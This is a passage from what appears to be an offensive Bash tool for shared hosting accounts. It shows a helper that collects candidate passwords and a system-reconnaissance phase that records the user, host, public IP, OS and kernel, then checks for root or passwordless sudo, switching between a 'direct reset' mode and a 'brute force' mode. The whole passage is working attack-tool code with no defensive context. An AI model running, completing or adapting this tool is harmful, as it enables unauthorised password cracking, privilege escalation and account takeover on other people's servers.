add_pass() {
    local p="$1"
    [[ -z "$p" || ${#p} -lt 3 || ${#p} -gt 128 ]] && return
    for existing in "${PASSWORDS[@]}"; do
        [[ "$existing" == "$p" ]] && return
    done
    PASSWORDS+=("$p")
}

# ═══════════════════════════════════════════════════════════════
# PHASE 1: SYSTEM DETECTION
# ═══════════════════════════════════════════════════════════════
detect_system() {
    log_section "PHASE 1: SYSTEM DETECTION"
    
    local server=$(hostname -f 2>/dev/null || hostname 2>/dev/null || echo "unknown")
    local ip=$(curl -s --max-time 3 ifconfig.me 2>/dev/null || wget -qO- --timeout=3 ifconfig.me 2>/dev/null || echo "unknown")
    local os=$(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d'"' -f2)
    local kernel=$(uname -r 2>/dev/null)
    
    log_ok "User     : ${W}${CPUSER}${N}"
    log_ok "Home     : ${W}${HOMEDIR}${N}"
    log_ok "Server   : ${W}${server}${N}"
    log_ok "IP       : ${W}${ip}${N}"
    [[ -n "$os" ]] && log_ok "OS       : ${W}${os}${N}"
    [[ -n "$kernel" ]] && log_ok "Kernel   : ${W}${kernel}${N}"
    
    if [[ $IS_ROOT -eq 1 ]]; then
        log_ok "Root     : ${BG_G}${W} YES — DIRECT RESET MODE ${N}"
    else
        log_warn "Root     : ${Y}NO${N} — brute force mode"
        # Check sudo
        local sudo_check=$(sudo -n true 2>&1)
        if [[ $? -eq 0 ]]; then
            IS_ROOT=1
            log_ok "Sudo     : ${BG_G}${W} NOPASSWD SUDO — PROMOTED TO ROOT ${N}"
        else
            sudo -l 2>&1 | grep -q "NOPASSWD" && {
                IS_ROOT=1
                log_ok "Sudo     : ${BG_G}${W} NOPASSWD DETECTED ${N}"
            }
        fi
    fi
}

